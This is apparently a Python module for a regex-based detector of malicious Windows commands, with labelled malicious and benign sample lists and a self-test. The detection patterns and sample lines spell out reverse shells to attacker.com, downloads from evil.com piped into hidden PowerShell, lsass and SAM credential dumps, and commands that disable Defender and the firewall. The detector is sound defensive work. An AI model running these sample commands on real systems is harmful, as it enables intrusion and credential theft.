import re
import json
import sqlite3
import logging
from typing import Dict, List, Any
from datetime import datetime
import time

logger = logging.getLogger(__name__)


# ============================================================================
# PATTERN DETECTION ENGINE
# ============================================================================

class CMDDetector:
    """Pattern matching engine for malicious command detection"""
    
    def __init__(self):
        self.patterns = {}
        self._initialize_patterns()
    
    def _initialize_patterns(self):
        """Initialize 47 regex patterns organized by severity"""
        
        # CRITICAL patterns (95%+ confidence) - Most dangerous attacks
        self.patterns['CRITICAL'] = [
            (r'cmd\s+/c\s+.*(?:powershell|pwsh).*-enc', 'Encoded PowerShell execution'),
            (r'powershell\s+(?:-e[nc]|-En|-Enc)', 'PowerShell encoded command'),
            (r'cmd\s+/c\s+powershell\s+-e[nc]', 'CMD PowerShell encoding'),
            (r'(?:certutil|bitsadmin|curl|wget).*(?:\.exe|\.dll|\.ps1|http)', 'Malware download attempt'),
            (r'certutil\s+(?:-download|-urlcache)', 'CertUtil download'),
            (r'bitsadmin\s+/transfer', 'BITS download'),
            (r'curl\s+(?:http|ftp).*\|.*(?:powershell|cmd)', 'Piped download'),
            (r'(?:mimikatz|rubeus|laZagne|procdump)', 'Credential stealing tool'),
            (r'cmd\s+/c\s+.*(?:lsass|ntds\.dit|sam)', 'Credential database access'),
            (r'dump.*(?:lsass|process|memory)', 'Memory dump attempt'),
            (r'reg\s+(?:add|import).*(?:SAM|SECURITY|SYSTEM|LSA)', 'Registry persistence'),
            (r'reg\s+(?:save|export).*(?:SAM|SECURITY|SYSTEM)', 'Registry dump'),
            (r'regedit\s+(?:/s|/c).*reg', 'Registry import'),
            (r'wmic\s+(?:process|service)\s+(?:delete|call\s+create)', 'WMIC deletion'),
            (r'taskkill\s+/f\s+/im\s+svchost', 'Force kill system process'),
            (r'sc\s+delete\s+\w+', 'Service deletion'),
            (r'(?:takeown|icacls)\s+.*\/grant', 'Privilege escalation'),
            (r'sc\s+(?:create|start)\s+\w+\s+binPath', 'Service creation for privilege'),
            (r'netsh\s+advfirewall\s+(?:set\s+allprofiles|firewall)\s+state\s+off', 'Firewall disable'),
            (r'netsh\s+firewall\s+set\s+opmode\s+disable', 'Firewall disable (old)'),
            (r'schtasks\s+/create.*\/tr', 'Scheduled task creation'),
            (r'at\s+\d+:\d+\s+(?:run|exec)', 'AT scheduler usage'),
        ]
        
        # HIGH patterns (70%+ confidence) - Very suspicious
        self.patterns['HIGH'] = [
            (r'cmd\s+/c\s+.*(?:nc\.exe|ncat|netcat).*-e\s+(?:cmd|powershell)', 'Reverse shell'),
            (r'bash\s+-i\s+>.*&\s+1', 'Bash reverse shell'),
            (r'del\s+/s\s+/q\s+(?:[A-Z]:|\\)', 'Mass file deletion'),
            (r'cipher\s+/w:\s*', 'SSD wipe attempt'),
            (r'format\s+(?:[A-Z]:|\\)', 'Disk format'),
            (r'(?:ipconfig|netstat|arp)\s+.*>\s*\w+\.txt', 'Network recon to file'),
            (r'route\s+print.*>\s*', 'Routing recon'),
            (r'netsh\s+(?:advfirewall|firewall).*rule\s+', 'Firewall rule modification'),
            (r'net\s+user\s+\w+\s+\w+\s+/add', 'User account creation'),
            (r'net\s+localgroup\s+(?:administrators|admin)', 'Group privilege grant'),
            (r'psexec\s+-s', 'PsExec system execution'),
        ]
        
        # MEDIUM patterns (50%+ confidence) - Suspicious but some legitimate use
        self.patterns['MEDIUM'] = [
            (r'powershell.*DownloadString', 'PowerShell download'),
            (r'powershell.*IEX', 'PowerShell invoke expression'),
            (r'powershell.*-NoProfile', 'PowerShell no profile'),
            (r'pspasswd\s+', 'PsPasswd usage'),
            (r'rar\s+(?:a|x).*-hp', 'RAR with hidden password'),
            (r'cmd\s+/c\s+(?:start|call).*>>.*&', 'CMD output redirection'),
            (r'powershell.*-WindowStyle\s+Hidden', 'Hidden PowerShell window'),
            (r'powershell.*-nop', 'PowerShell no profile (nop)'),
            (r'powershell.*-w\s+hidden', 'PowerShell hidden window'),
            (r'iex\s+', 'Invoke-Expression shorthand'),
        ]
        
        # LOW patterns (30% confidence) - Minor risk indicators
        self.patterns['LOW'] = [
            (r'python\s+-c\s+', 'Python command execution'),
            (r'perl\s+-e\s+', 'Perl command execution'),
            (r'cscript\s+\w+\.vbs', 'VBScript execution'),
            (r'wscript\s+\w+\.vbs', 'Windows script host'),
        ]
    
    def detect(self, command: str) -> Dict[str, Any]:
        """Detect if command is malicious"""
        command_lower = command.lower()
        
        # Check each severity level in order
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            for pattern, description in self.patterns.get(severity, []):
                if re.search(pattern, command_lower, re.IGNORECASE):
                    return {
                        'is_malicious': True,
                        'severity': severity.lower(),
                        'confidence': self._get_confidence(severity),
                        'reason': f"{severity}: {description}",
                        'pattern': pattern,
                        'matched_pattern': description
                    }
        
        return {
            'is_malicious': False,
            'severity': 'unknown',
            'confidence': 0.0,
            'reason': 'No malicious patterns detected',
            'pattern': None,
            'matched_pattern': None
        }
    
    def detect_batch(self, commands: List[str]) -> List[Dict[str, Any]]:
        """Detect malicious patterns in multiple commands"""
        return [self.detect(cmd) for cmd in commands]
    
    def _get_confidence(self, severity: str) -> float:
        """Get confidence score based on severity"""
        confidence_map = {
            'CRITICAL': 0.95,
            'HIGH': 0.75,
            'MEDIUM': 0.60,
            'LOW': 0.30
        }
        return confidence_map.get(severity, 0.0)
    
    def get_pattern_count(self) -> Dict[str, int]:
        """Get pattern statistics"""
        return {
            severity: len(patterns) 
            for severity, patterns in self.patterns.items()
        }


# ============================================================================
# TRAINING DATA GENERATOR
# ============================================================================

class CMDTrainingDataGenerator:
    """Generate training data for validation"""
    
    @staticmethod
    def generate_malicious_samples() -> List[str]:
        """Generate 28 malicious command samples"""
        return [
            'cmd /c powershell -enc JABhID0gMjAwMzsg',
            'powershell -e JABhID0gMjAwMzs=',
            'certutil -download http://malware.com/payload.exe C:\\payload.exe',
            'bitsadmin /create job && bitsadmin /transfer job http://evil.com/mal.exe C:\\mal.exe',
            'curl http://attacker.com/backdoor.ps1 | powershell -nop -w hidden',
            'wget http://malicious.site/exploit.exe -O C:\\exploit.exe',
            'cmd /c mimikatz.exe privilege::debug sekurlsa::logonpasswords',
            'rubeus.exe kerberoast /outfile:tickets.txt',
            'procdump -ma lsass.exe lsass.dmp',
            'cmd /c laZagne all -o output.txt',
            'reg save HKLM\\SAM C:\\sam.hive',
            'reg export HKLM\\SECURITY C:\\security.hive',
            'reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1',
            'wmic process where name="svchost.exe" delete',
            'taskkill /f /im explorer.exe',
            'sc delete WinDefend',
            'cmd /c nc.exe -e cmd.exe attacker.com 4444',
            'cmd /c netcat -l -p 5555 -e cmd.exe',
            'del /s /q C:\\Users\\*\\Desktop\\*',
            'cipher /w:C:\\',
            'netsh advfirewall set allprofiles state off',
            'netsh firewall set opmode disable',
            'schtasks /create /tn evilTask /tr C:\\evil.exe /sc onstart',
            'at 12:00 /every:M run.exe',
            'net user Administrator Password123 /add',
            'net localgroup administrators attacker /add',
            'powershell -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString()',
            'reg add HKLM\\Run /v malware /t REG_SZ /d C:\\evil.exe',
        ]
    
    @staticmethod
    def generate_benign_samples() -> List[str]:
        """Generate 28 benign command samples"""
        return [
            'dir C:\\',
            'ipconfig',
            'tasklist',
            'systeminfo',
            'echo Hello World',
            'cls',
            'cd C:\\Users',
            'copy file1.txt file2.txt',
            'del file.txt',
            'type config.txt',
            'powershell Get-Process',
            'powershell Get-Service',
            'net user Administrator',
            'whoami',
            'hostname',
            'wmic os get name',
            'reg query HKLM\\Software',
            'ipconfig /all',
            'netstat -an',
            'arp -a',
            'route print',
            'ping google.com',
            'nslookup google.com',
            'tracert google.com',
            'certutil -hashfile file.exe SHA256',
            'wmic logicaldisk get name',
            'powershell -Command Get-ChildItem C:\\',
            'cmd /c echo test > output.txt',
        ]


# ============================================================================
# ML MODEL
# ============================================================================

class CMDMaliciousCommandModel:
    """Complete ML system for malicious command detection"""
    
    def __init__(self):
        self.detector = CMDDetector()
        self.model_accuracy = 0.0
        self.training_complete = False
    
    def train(self, verbose: bool = False) -> Dict[str, Any]:
        """Train model on sample data"""
        generator = CMDTrainingDataGenerator()
        malicious_samples = generator.generate_malicious_samples()
        benign_samples = generator.generate_benign_samples()
        
        # Test malicious detection
        malicious_correct = 0
        for cmd in malicious_samples:
            result = self.detector.detect(cmd)
            if result['is_malicious']:
                malicious_correct += 1
            if verbose:
                status = '✅' if result['is_malicious'] else '❌'
                print(f"{status} Malicious: {cmd[:50]}...")
        
        if verbose:
            print()
        
        # Test benign detection
        benign_correct = 0
        for cmd in benign_samples:
            result = self.detector.detect(cmd)
            if not result['is_malicious']:
                benign_correct += 1
            if verbose:
                status = '✅' if not result['is_malicious'] else '❌'
                print(f"{status} Benign: {cmd[:50]}...")
        
        # Calculate accuracy
        total_correct = malicious_correct + benign_correct
        total_samples = len(malicious_samples) + len(benign_samples)
        self.model_accuracy = total_correct / total_samples if total_samples > 0 else 0.0
        
        results = {
            'malicious_accuracy': malicious_correct / len(malicious_samples),
            'benign_accuracy': benign_correct / len(benign_samples),
            'accuracy': self.model_accuracy,
            'total_samples': total_samples,
            'malicious_samples': len(malicious_samples),
            'benign_samples': len(benign_samples),
            'total_patterns': sum(self.detector.get_pattern_count().values())
        }
        
        self.training_complete = True
        return results
    
    def predict(self, command: str) -> Dict[str, Any]:
        """Predict if command is malicious"""
        return self.detector.detect(command)


# ============================================================================
# TESTING (when run directly)
# ============================================================================

if __name__ == '__main__':
    print("Testing CMD Malicious Command Detector...\n")
    
    model = CMDMaliciousCommandModel()
    print("Training model...")
    results = model.train(verbose=False)
    
    print(f"\n✅ Training Complete!")
    print(f"Accuracy: {results['accuracy']*100:.0f}%")
    print(f"Total Patterns: {results['total_patterns']}\n")
    
    # Test predictions
    test_commands = [
        ('powershell -enc JABhID0gMjAwMzs=', 'MALICIOUS'),
        ('dir C:\\', 'CLEAN'),
        ('certutil -download http://evil.com/mal.exe', 'MALICIOUS'),
        ('ipconfig /all', 'CLEAN'),
    ]
    
    print("Testing predictions:")
    for cmd, expected in test_commands:
        result = model.predict(cmd)
        status = '✅' if result['is_malicious'] == (expected == 'MALICIOUS') else '❌'
        print(f"{status} {cmd[:50]:50} → {result['severity'].upper():8} ({result['confidence']*100:.0f}%)")